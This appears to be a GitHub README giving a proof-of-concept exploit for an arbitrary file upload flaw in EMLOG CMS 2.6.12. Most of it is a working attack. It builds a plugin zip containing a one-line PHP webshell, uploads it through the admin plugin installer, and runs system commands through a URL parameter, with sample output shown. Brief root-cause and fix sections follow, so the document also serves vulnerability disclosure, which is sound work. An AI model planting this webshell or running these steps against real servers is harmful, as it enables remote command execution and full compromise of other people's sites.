# emlog-upload-rce-poc
EMLOG CMS arbitrary file upload vulnerability. Affects version: 2.6.12 PoC and reproduction steps for CVE-XXXX-XXXX.

Step 1: Prepare Malicious Plugin Archive
Create the following directory structure:

eval.zip
└── eval/
    └── eval.php

Step 2: Create Malicious PHP File
File: eval/eval.php

<?php system($_GET['cmd']); ?>

This file acts as a simple webshell that executes system commands.

Step 3: Upload the Plugin
Log in to the application backend.
Navigate to the plugin upload/install feature.
Upload the crafted eval.zip file.

Step 4: File Extraction Location
After successful upload, the archive is extracted to:
/content/plugins/eval/eval.php

Step 5: Trigger Remote Code Execution
Access the uploaded file via browser:
http://<target-ip>/content/plugins/eval/eval.php?cmd=id

Expected Result
The command is executed on the server, and its output is displayed in the response.
Example:
uid=33(www-data) gid=33(www-data) groups=33(www-data)

Root Cause
The application only checks for the existence of a specific PHP file to validate plugin structure.
It does not validate file content or restrict executable file types.

Security Impact
Arbitrary PHP file upload
Remote command execution
Full compromise of the web application

Suggested Fix
Extract archives to a non-web-accessible directory
Implement strict validation of archive contents
Use a whitelist-based plugin structure validation
